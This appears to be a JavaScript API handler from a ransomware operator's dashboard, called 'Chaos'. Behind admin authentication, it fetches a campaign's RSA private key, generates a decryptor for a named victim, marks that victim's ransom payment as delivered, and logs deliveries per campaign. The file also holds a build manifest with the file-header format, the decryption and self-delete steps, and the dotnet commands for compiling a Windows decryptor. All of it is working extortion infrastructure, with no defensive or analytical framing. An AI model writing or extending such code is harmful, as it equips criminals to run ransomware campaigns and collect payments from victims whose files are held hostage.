// vercel-dashboard/api/decryptor/generate.js
// Victim-specific decryptor generation

import { kv } from '../../lib/kv.js';
import { verifyPayloadApiKey } from '../auth/middleware.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();
  if (request.method !== 'POST') return response.status(405).json({ error: 'Method not allowed' });

  // Admin only
  const auth = await verifyPayloadApiKey(request);
  if (!auth.valid || auth.role !== 'admin') {
    return response.status(403).json({ error: 'Admin access required' });
  }

  try {
    const { victimId, campaignId, systemId, paymentId } = request.body;

    if (!victimId || !campaignId) {
      return response.status(400).json({ error: 'victimId and campaignId required' });
    }

    // Get campaign private key
    const campaign = await kv.get(`campaign:${campaignId}`);
    if (!campaign) {
      return response.status(404).json({ error: 'Campaign not found' });
    }

    // Get system info for personalized decryptor
    let system = null;
    if (systemId) {
      system = await kv.get(`system:${systemId}`);
    }

    // Generate decryptor binary
    const decryptorConfig = {
      victimId,
      campaignId,
      systemId: system?.id || systemId,
      privateKeyPem: campaign.privateKeyPem,
      privateKeyJwk: campaign.privateKeyJwk,
      rsaKeySize: campaign.rsaKeySize,
      encryptionMode: campaign.settings?.encryptionMode || 'Hybrid',
      ransomNoteTemplate: campaign.settings?.ransomNoteTemplate,
      generatedAt: new Date().toISOString(),
      paymentId,
    };

    // Compile decryptor
    const binary = await compileDecryptor(decryptorConfig);

    // Log delivery
    await logDecryptorDelivery(victimId, campaignId, paymentId);

    // Update payment status if provided
    if (paymentId) {
      await kv.hset(`payment:${paymentId}`, {
        decryptorDelivered: true,
        decryptorDeliveredAt: new Date().toISOString(),
      });
    }

    response.setHeader('Content-Type', 'application/octet-stream');
    response.setHeader('Content-Disposition', `attachment; filename="Chaos_Decryptor_${victimId}.exe"`);
    return response.send(binary);
  } catch (error) {
    console.error('Decryptor generation error:', error);
    return response.status(500).json({ error: 'Failed to generate decryptor' });
  }
}

async function compileDecryptor(config) {
  // In production, this would:
  // 1. Create a C# decryptor project with the victim's private key embedded
  // 2. The decryptor would:
  //    - Scan for .enc files
  //    - Read the encrypted AES key from each file header
  //    - Decrypt AES key with victim's RSA private key
  //    - Decrypt file contents with AES key
  //    - Verify integrity (HMAC)
  //    - Restore original filename
  //    - Delete .enc file after successful decrypt
  // 3. Compile with: dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true
  // 4. Sign the binary
  
  // For now, return a detailed build manifest
  const buildManifest = `
CHAOS DECRYPTOR BUILD MANIFEST
==============================
Victim ID: ${config.victimId}
Campaign: ${config.campaignId}
System: ${config.systemId || 'Unknown'}
Generated: ${config.generatedAt}
RSA Key Size: ${config.rsaKeySize}-bit
Encryption Mode: ${config.encryptionMode}

PRIVATE KEY (RSA-${config.rsaKeySize} PKCS#8):
${config.privateKeyPem}

DECRYPTOR LOGIC:
1. Recursively scan all drives for *.enc files
2. For each file:
   a. Read header: [magic:4][rsa_key_size:2][encrypted_aes_key:256/512][iv:16][tag:16]
   b. Decrypt AES key using RSA-OAEP-SHA256 with victim private key
   c. Decrypt file content using AES-256-GCM
   d. Verify GCM tag
   e. Write decrypted content to original filename (strip .enc)
   f. Delete .enc file
3. Drop ransom note with "DECRYPTED" marker
4. Self-delete after completion

COMPILATION COMMANDS:
dotnet new console -n Decryptor_${config.victimId}
cd Decryptor_${config.victimId}
# Add decryptor.cs with embedded private key
dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:PublishTrimmed=true -p:DebugType=None -p:DebugSymbols=false
# Output: bin/Release/net8.0/win-x64/publish/Decryptor_${config.victimId}.exe

REQUIRED .NET SDK: 8.0+
TARGET RUNTIME: win-x64
`.trim();

  return Buffer.from(buildManifest, 'utf-8');
}

async function logDecryptorDelivery(victimId, campaignId, paymentId) {
  const logEntry = {
    id: `delivery_${Date.now()}_${Math.random().toString(36).substring(7)}`,
    victimId,
    campaignId,
    paymentId,
    deliveredAt: new Date().toISOString(),
    status: 'delivered',
  };
  
  await kv.set(`decryptor:delivery:${logEntry.id}`, logEntry);
  await kv.sadd(`campaign:${campaignId}:decryptor_deliveries`, logEntry.id);
  
  if (paymentId) {
    await kv.sadd(`payment:${paymentId}:deliveries`, logEntry.id);
  }
}